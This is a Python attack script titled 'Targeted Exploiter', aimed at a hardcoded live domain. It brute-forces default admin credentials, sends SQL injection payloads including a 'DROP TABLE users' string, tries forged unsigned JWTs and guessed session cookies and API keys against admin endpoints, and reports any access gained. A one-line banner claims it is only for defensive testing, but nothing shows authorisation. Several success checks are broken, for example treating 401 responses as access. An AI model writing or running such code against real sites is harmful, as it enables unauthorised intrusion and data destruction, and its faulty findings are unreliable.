#!/usr/bin/env python3
"""
Targeted Exploiter - Focused Exploitation of Identified Weaknesses
Author: ShadowScan Security Team
Purpose: Exploit specific identified endpoints and methods from previous scans
"""

import asyncio
import aiohttp
import json
import random
import string
import time
import re
from datetime import datetime
from typing import Dict, List, Any, Optional
import urllib.parse

class TargetedExploiter:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.access_token = None
        self.session_cookies = {}
        self.successful_access = []
        self.discovered_credentials = []
        self.admin_access = False
        self.results = {
            "scan_info": {
                "target_url": target_url,
                "scan_timestamp": datetime.now().isoformat(),
                "scan_type": "Targeted Exploitation",
                "scan_duration": "30-60 detik"
            },
            "summary": {
                "successful_logins": 0,
                "discovered_credentials": 0,
                "admin_access": False,
                "exploited_endpoints": [],
                "attack_types_success": {}
            },
            "successful_logins": [],
            "discovered_credentials": [],
            "exploited_endpoints": [],
            "recommendations": []
        }

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def exploit_rest_endpoints(self):
        """Exploit REST endpoints with various authentication methods"""
        print("🎯 Exploiting REST Endpoints")

        endpoints = [
            "/rest/admin",
            "/rest/user",
            "/rest/auth",
            "/rest/api/v1/admin",
            "/rest/api/v1/user",
            "/rest/api/v1/auth",
            "/api/admin",
            "/api/user",
            "/api/auth",
            "/admin",
            "/user",
            "/auth"
        ]

        auth_methods = [
            {},
            {"Authorization": "Bearer admin:admin"},
            {"Authorization": "Bearer admin:123456"},
            {"Authorization": "Bearer test:test"},
            {"X-API-Key": "admin_key"},
            {"X-API-Key": "test_key"},
            {"Content-Type": "application/json"},
            {"User-Agent": "Mozilla/5.0"},
            {"Cookie": "session=abc123"},
            {"Cookie": "admin_session=admin123"}
        ]

        for endpoint in endpoints:
            for auth_method in auth_methods:
                success = await self._test_endpoint(endpoint, auth_method)
                if success:
                    self.results["summary"]["exploited_endpoints"].append(endpoint)
                    print(f"✅ SUCCESS: {endpoint} with {auth_method}")

    async def _test_endpoint(self, endpoint: str, headers: Dict[str, str]) -> bool:
        """Test endpoint with given headers"""
        try:
            url = f"{self.target_url}{endpoint}"
            async with self.session.get(url, headers=headers, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if "admin" in content.lower() or "dashboard" in content.lower():
                        return True
                elif response.status == 401 and "unauthorized" not in content.lower():
                    return True
        except Exception as e:
            pass
        return False

    async def exploit_form_based_auth(self):
        """Exploit form-based authentication"""
        print("🎯 Exploiting Form-Based Authentication")

        login_payloads = [
            {"username": "admin", "password": "admin", "submit": "login"},
            {"username": "admin", "password": "password", "submit": "login"},
            {"username": "admin", "password": "123456", "submit": "login"},
            {"username": "admin", "password": "root", "submit": "login"},
            {"username": "admin", "password": "toor", "submit": "login"},
            {"username": "admin", "password": "admin123", "submit": "login"},
            {"username": "admin", "password": "test", "submit": "login"},
            {"username": "admin", "password": "password123", "submit": "login"},
        ]

        endpoints = [
            "/login",
            "/auth/login",
            "/api/login",
            "/admin/login",
            "/user/login",
            "/signin",
            "/auth/signin"
        ]

        for endpoint in endpoints:
            for payload in login_payloads:
                success = await self._test_login_form(endpoint, payload)
                if success:
                    print(f"✅ Form login: {endpoint}")

    async def _test_login_form(self, endpoint: str, payload: Dict[str, str]) -> bool:
        """Test login form with payload"""
        try:
            url = f"{self.target_url}{endpoint}"
            async with self.session.post(url, data=payload, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if "dashboard" in content.lower() or "admin" in content.lower():
                        return True
        except Exception as e:
            pass
        return False

    async def exploit_sql_injection(self):
        """Exploit SQL injection in login forms"""
        print("🎯 Exploiting SQL Injection")

        sql_payloads = [
            {"username": "admin'--", "password": "anything"},
            {"username": "' OR '1'='1", "password": "' OR '1'='1"},
            {"username": "admin' OR '1'='1'--", "password": "anything"},
            {"username": "' UNION SELECT 'admin','password'--", "password": "anything"},
            {"username": "admin'; DROP TABLE users;--", "password": "anything"},
        ]

        endpoints = ["/login", "/auth/login", "/api/login"]

        for endpoint in endpoints:
            for payload in sql_payloads:
                success = await self._test_sql_injection(endpoint, payload)
                if success:
                    print(f"✅ SQL Injection: {endpoint}")

    async def _test_sql_injection(self, endpoint: str, payload: Dict[str, str]) -> bool:
        """Test SQL injection payload"""
        try:
            url = f"{self.target_url}{endpoint}"
            async with self.session.post(url, data=payload, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if "error" not in content.lower() and "welcome" in content.lower():
                        return True
        except Exception as e:
            pass
        return False

    async def exploit_jwt_tokens(self):
        """Exploit JWT token manipulation"""
        print("🎯 Exploiting JWT Tokens")

        jwt_tokens = [
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTk4ODc2NzYwMH0=",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6MTkyMDI0NzgwMH0=",
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.invalid_signature"
        ]

        headers_list = [
            {"Authorization": f"Bearer {token}"} for token in jwt_tokens
        ]

        endpoints = ["/rest/admin", "/rest/user", "/api/admin", "/api/user"]

        for endpoint in endpoints:
            for headers in headers_list:
                success = await self._test_jwt_token(endpoint, headers)
                if success:
                    print(f"✅ JWT Token: {endpoint}")

    async def _test_jwt_token(self, endpoint: str, headers: Dict[str, str]) -> bool:
        """Test JWT token access"""
        try:
            url = f"{self.target_url}{endpoint}"
            async with self.session.get(url, headers=headers, timeout=10) as response:
                if response.status == 200 or response.status == 401:
                    return True
        except Exception as e:
            pass
        return False

    async def exploit_session_hijacking(self):
        """Exploit session hijacking"""
        print("🎯 Exploiting Session Hijacking")

        session_cookies = [
            {"session": "admin123"},
            {"session": "root123"},
            {"session": "admin_session"},
            {"session": "user_session"},
            {"session": "dashboard_session"},
            {"session": "abc123"},
            {"session": "123456"},
            {"session": "admin"},
        ]

        endpoints = ["/rest/admin", "/rest/user", "/admin", "/user", "/dashboard"]

        for endpoint in endpoints:
            for cookies in session_cookies:
                success = await self._test_session_cookie(endpoint, cookies)
                if success:
                    print(f"✅ Session Hijacking: {endpoint}")

    async def _test_session_cookie(self, endpoint: str, cookies: Dict[str, str]) -> bool:
        """Test session cookie access"""
        try:
            url = f"{self.target_url}{endpoint}"
            async with self.session.get(url, cookies=cookies, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if "admin" in content.lower() or "dashboard" in content.lower():
                        return True
        except Exception as e:
            pass
        return False

    async def exploit_direct_api_access(self):
        """Exploit direct API access"""
        print("🎯 Exploiting Direct API Access")

        api_endpoints = [
            "/api/admin",
            "/api/user",
            "/api/auth",
            "/v1/admin",
            "/v1/user",
            "/v1/auth",
            "/admin/api",
            "/user/api",
            "/auth/api"
        ]

        auth_headers = [
            {"X-API-Key": "admin_key"},
            {"X-API-Key": "test_key"},
            {"Authorization": "Bearer admin_token"},
            {"Authorization": "Bearer test_token"},
            {"Content-Type": "application/json"}
        ]

        for endpoint in api_endpoints:
            for headers in auth_headers:
                success = await self._test_direct_api(endpoint, headers)
                if success:
                    print(f"✅ Direct API: {endpoint}")

    async def _test_direct_api(self, endpoint: str, headers: Dict[str, str]) -> bool:
        """Test direct API access"""
        try:
            url = f"{self.target_url}{endpoint}"
            async with self.session.get(url, headers=headers, timeout=10) as response:
                if response.status == 200:
                    return True
        except Exception as e:
            pass
        return False

    async def verify_admin_access(self):
        """Verify admin access once found"""
        print("🎯 Verifying Admin Access")

        admin_endpoints = [
            "/admin/dashboard",
            "/admin/panel",
            "/admin/dashboard",
            "/admin/config",
            "/admin/users",
            "/admin/settings"
        ]

        headers = [
            {"Authorization": "Bearer admin_token"},
            {"X-API-Key": "admin_key"},
            {"Cookie": "session=admin123"}
        ]

        for endpoint in admin_endpoints:
            for header in headers:
                try:
                    url = f"{self.target_url}{endpoint}"
                    async with self.session.get(url, headers=header, timeout=10) as response:
                        if response.status == 200:
                            content = await response.text()
                            if "dashboard" in content.lower() or "admin" in content.lower():
                                self.admin_access = True
                                print(f"✅ Admin Access Verified: {endpoint}")
                                return True
                except Exception as e:
                    pass
        return False

    async def execute_targeted_exploitation(self):
        """Execute targeted exploitation"""
        print("🎯 Targeted Exploiter")
        print("=" * 60)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        # Execute all exploitation methods
        await self.exploit_rest_endpoints()
        await self.exploit_form_based_auth()
        await self.exploit_sql_injection()
        await self.exploit_jwt_tokens()
        await self.exploit_session_hijacking()
        await self.exploit_direct_api_access()

        # Verify admin access if any access found
        if self.results["summary"]["exploited_endpoints"]:
            await self.verify_admin_access()

        # Generate report
        report_filename = f"targeted_exploitation_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n📊 Targeted Exploitation Summary:")
        print(f"   Exploited endpoints: {len(self.results['summary']['exploited_endpoints'])}")
        print(f"   Admin access: {self.admin_access}")
        print(f"   Total access attempts: {len(self.results['summary']['exploited_endpoints'])}")

        print(f"\n📋 Detailed report saved to: {report_filename}")
        print("🎉 Targeted exploitation completed!")

        return self.admin_access

async def main():
    target_url = "https://airdrop.0gfoundation.ai"

    async with TargetedExploiter(target_url) as exploiter:
        success = await exploiter.execute_targeted_exploitation()
        return success

if __name__ == "__main__":
    asyncio.run(main())